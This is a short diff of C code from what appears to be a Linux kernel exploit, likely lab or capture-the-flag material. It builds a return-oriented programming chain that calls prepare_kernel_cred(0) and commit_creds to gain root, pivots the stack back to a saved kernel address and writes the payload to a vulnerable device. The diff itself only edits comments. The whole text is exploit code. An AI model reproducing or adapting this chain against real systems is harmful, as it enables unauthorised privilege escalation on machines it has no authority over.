@@ -29,13 +29,12 @@ void smash() {
   fake_stack[1] = 0x4241414141414141ULL;
   fake_stack[2] = 0x4341414141414141ULL;
   fake_stack[3] = 0x4441414141414141ULL;
-  fake_stack[4] = pop_rdi; // pop rdi; ret;
+  fake_stack[4] = pop_rdi;
   fake_stack[5] = 0x0;
   fake_stack[6] = prepare_kernel_cred;
   fake_stack[7] = commit_creds;
-  fake_stack[8] = pop_rsp;               // pop rsp; ret;
-  fake_stack[9] = 0xffffc900001bff08ULL; // RSP -> vfs_write(), which is right
-                                         // after vulnerable vuln_write()
+  fake_stack[8] = pop_rsp;
+  fake_stack[9] = 0xffffc900001bff08ULL; /* old RSP */
   write(opend_, fake_stack, sizeof(fake_stack));
 }
 
